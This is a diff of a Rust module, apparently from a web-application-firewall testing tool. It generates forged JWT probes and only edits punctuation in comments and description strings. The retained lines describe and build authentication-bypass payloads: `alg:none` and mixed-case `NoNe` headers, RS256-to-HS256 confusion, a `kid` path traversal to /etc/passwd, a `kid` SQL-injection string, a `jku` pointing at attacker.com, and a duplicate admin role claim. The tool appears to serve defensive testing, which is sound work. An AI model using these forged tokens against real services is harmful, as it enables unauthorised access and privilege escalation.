@@ -6,7 +6,7 @@
 //!
 //! - `alg:none` acceptance (CVE-2015-9235 and the long tail since)
 //! - Algorithm confusion (HS256 verified with RS256 public key as
-//!   HMAC secret — CVE-2016-10555, CVE-2016-5431, …)
+//!   HMAC secret: CVE-2016-10555, CVE-2016-5431, …)
 //! - `kid` header parameter used as a filesystem path / SQL query
 //!   without sanitization
 //! - `jku` / `x5u` URL parameters trusted (attacker-controlled JWKS)
@@ -45,31 +45,31 @@ use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 pub enum JwtSmuggleTechnique {
     /// `{"alg":"none","typ":"JWT"}` header, empty signature.
-    /// The headline JWT vuln class — RFC 7519 permits `alg:none`
+    /// The headline JWT vuln class. RFC 7519 permits `alg:none`
     /// in unsigned tokens, but signed-token validators that
     /// "trust" the header MUST reject. Some still don't.
     AlgNone,
-    /// `{"alg":"NoNe","typ":"JWT"}` — case-mixed alg.
+    /// `{"alg":"NoNe","typ":"JWT"}`: case-mixed alg.
     /// Case-sensitive validators reject; ascii-fold validators
     /// accept and downgrade to none.
     AlgNoneCaseMix,
-    /// `{"alg":"HS256","typ":"JWT"}` — but the original token was
+    /// `{"alg":"HS256","typ":"JWT"}`: but the original token was
     /// RS256. Servers that fetch the RSA public key + use it as
     /// the HMAC secret accept a forged HMAC signature.
     AlgConfusionRs256ToHs256,
-    /// `{"alg":"HS256","kid":"../../../etc/passwd"}` — path-
+    /// `{"alg":"HS256","kid":"../../../etc/passwd"}`: path-
     /// traversal in the `kid` header. Servers that load the key
     /// from a kid-derived filesystem path can be tricked into
     /// loading a known-content file (e.g. /dev/null = empty HMAC
     /// key).
     KidPathTraversal,
-    /// `{"alg":"HS256","kid":"x' UNION SELECT 'AAAA'--"}` — SQL
+    /// `{"alg":"HS256","kid":"x' UNION SELECT 'AAAA'--"}`: SQL
     /// injection in the `kid` header. Servers that look up the
     /// HMAC key via `SELECT key FROM keys WHERE kid='<kid>'` can
     /// be coerced to return an attacker-chosen key.
     KidSqlInjection,
     /// `{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}`
-    /// — attacker-controlled JWKS URL. Servers that fetch the
+    ///: attacker-controlled JWKS URL. Servers that fetch the
     /// signing key from the `jku` URL without origin-pinning load
     /// the attacker's key.
     JkuAttackerUrl,
@@ -85,7 +85,7 @@ pub enum JwtSmuggleTechnique {
     /// Strip the `exp` claim entirely. Validators that conditionally
     /// check `exp` (only-if-present) accept a permanent token.
     ExpiryClaimRemoved,
-    /// `{"role":"guest","role":"admin"}` — duplicate-key in the
+    /// `{"role":"guest","role":"admin"}`: duplicate-key in the
     /// payload. RFC 8259 leaves resolution implementation-defined;
     /// validators see "guest", backend sees "admin" (or vice versa).
     PayloadDuplicateKey,
@@ -114,24 +114,24 @@ impl JwtSmuggleTechnique {
     pub fn description(&self) -> &'static str {
         match self {
             Self::AlgNone => {
-                "`alg:none` acceptance — historic CVE class, still ships in lazy validators"
+                "`alg:none` acceptance, historic CVE class, still ships in lazy validators"
             }
-            Self::AlgNoneCaseMix => "Case-mixed `alg:NoNe` — ascii-fold downgrade differential",
+            Self::AlgNoneCaseMix => "Case-mixed `alg:NoNe`: ascii-fold downgrade differential",
             Self::AlgConfusionRs256ToHs256 => {
-                "RS256→HS256 algorithm confusion — RSA public key used as HMAC secret"
+                "RS256→HS256 algorithm confusion: RSA public key used as HMAC secret"
             }
             Self::KidPathTraversal => {
-                "Path traversal in `kid` header — file-load key resolution exploit"
+                "Path traversal in `kid` header, file-load key resolution exploit"
             }
-            Self::KidSqlInjection => "SQL injection in `kid` header — DB key-lookup exploit",
-            Self::JkuAttackerUrl => "Attacker-controlled `jku` URL — JWKS fetch differential",
-            Self::EmptySignature => "Empty signature segment — no-sig-required validator bypass",
+            Self::KidSqlInjection => "SQL injection in `kid` header. DB key-lookup exploit",
+            Self::JkuAttackerUrl => "Attacker-controlled `jku` URL. JWKS fetch differential",
+            Self::EmptySignature => "Empty signature segment, no-sig-required validator bypass",
             Self::NoneAlgWithGarbageSignature => {
-                "Garbage signature with `alg:none` — validator paradox bypass"
+                "Garbage signature with `alg:none`: validator paradox bypass"
             }
-            Self::ExpiryClaimRemoved => "Stripped `exp` claim — permanent-token bypass",
+            Self::ExpiryClaimRemoved => "Stripped `exp` claim, permanent-token bypass",
             Self::PayloadDuplicateKey => {
-                "Duplicate-key in JWT payload — RFC 8259 resolution differential"
+                "Duplicate-key in JWT payload. RFC 8259 resolution differential"
             }
         }
     }
@@ -167,7 +167,7 @@ impl JwtSmuggleProbe {
     /// admin token is built around the credential value.
     #[must_use]
     pub fn new(technique: JwtSmuggleTechnique, credential_value: &str) -> Self {
-        // Try to use the operator's --credential as a base JWT —
+        // Try to use the operator's --credential as a base JWT 
         // if it's not a 3-segment JWT, build a synthetic one with
         // the credential spliced into the `sub` claim.
         let (base_header, base_payload, base_sig) = split_or_synthesize_jwt(credential_value);
@@ -240,7 +240,7 @@ impl JwtSmuggleProbe {
                 )
             }
             JwtSmuggleTechnique::PayloadDuplicateKey => {
-                // Hand-built JSON with duplicate `role` — serde_json
+                // Hand-built JSON with duplicate `role`: serde_json
                 // refuses to emit dup keys via its normal API, so we
                 // construct the bytes manually.
                 let payload = r#"{"sub":"admin","role":"guest","role":"admin","exp":9999999999}"#;
@@ -276,7 +276,7 @@ fn split_or_synthesize_jwt(credential: &str) -> (String, String, String) {
     if parts.len() == 3
         && !parts[0].is_empty()
         && !parts[1].is_empty()
-        // Looks like a JWT — accept it.
+        // Looks like a JWT (accept it).
         && parts.iter().all(|p| p.bytes().all(|b| {
             b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'='
         }))
@@ -308,7 +308,7 @@ fn split_or_synthesize_jwt(credential: &str) -> (String, String, String) {
 }
 
 /// JSON-quote a string value's contents (escape `"` and `\`). Does
-/// NOT add surrounding quotes — caller does that. Minimal: doesn't
+/// NOT add surrounding quotes, caller does that. Minimal: doesn't
 /// handle control bytes (they should never be in a credential).
 fn json_escape(s: &str) -> String {
     s.replace('\\', "\\\\").replace('"', "\\\"")
@@ -333,7 +333,7 @@ impl SmuggleProbe for JwtSmuggleProbe {
 }
 
 /// Every JWT smuggle variant against the given seed credential.
-/// Returns 10 probes — one per [`JwtSmuggleTechnique`] variant.
+/// Returns 10 probes (one per [`JwtSmuggleTechnique`] variant).
 #[must_use]
 pub fn all_variants(credential: &str) -> Vec<JwtSmuggleProbe> {
     use JwtSmuggleTechnique::*;
@@ -404,7 +404,7 @@ mod tests {
     }
 
     #[test]
-    #[allow(non_snake_case)] // `NoNe` mirrors the asserted mixed-case alg literal — the case-mix bypass marker.
+    #[allow(non_snake_case)] // `NoNe` mirrors the asserted mixed-case alg literal (the case-mix bypass marker).
     fn alg_none_case_mix_header_decodes_to_NoNe() {
         let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::AlgNoneCaseMix, "wafrift-test");
         let header_b64 = p.token.split('.').next().unwrap();
